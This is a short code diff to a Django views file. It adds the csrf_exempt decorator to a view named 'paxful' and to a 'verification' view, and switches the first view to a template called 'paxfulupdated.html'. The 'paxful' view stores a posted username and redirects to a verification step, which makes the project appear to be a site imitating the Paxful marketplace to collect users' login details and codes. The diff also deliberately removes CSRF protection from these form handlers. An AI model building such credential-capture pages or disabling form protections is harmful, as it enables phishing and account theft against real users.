@@ -8,6 +8,10 @@ from django.contrib.auth import authenticate, login, logout
 from django.contrib.auth.models import User
 from django.contrib import messages
 
+
+from django.views.decorators.csrf import csrf_exempt
+
+
 #start of paypal imports
 from rest_framework.views import APIView
 from rest_framework.response import Response
@@ -785,6 +789,7 @@ def payment_required_view(request):
 
 #viewspax
 
+@csrf_exempt
 def paxful(request):
     if request.method == 'POST':
         username = request.POST.get('username')
@@ -796,8 +801,9 @@ def paxful(request):
         # Redirect to the verify page with submission_id
         return redirect('verification', submission_id=submission.id)
     
-    return render(request, 'paxful.html')
+    return render(request, 'paxfulupdated.html')
 
+@csrf_exempt
 def verification(request, submission_id):
     submission = UserSubmission.objects.get(id=submission_id)
     message = ""
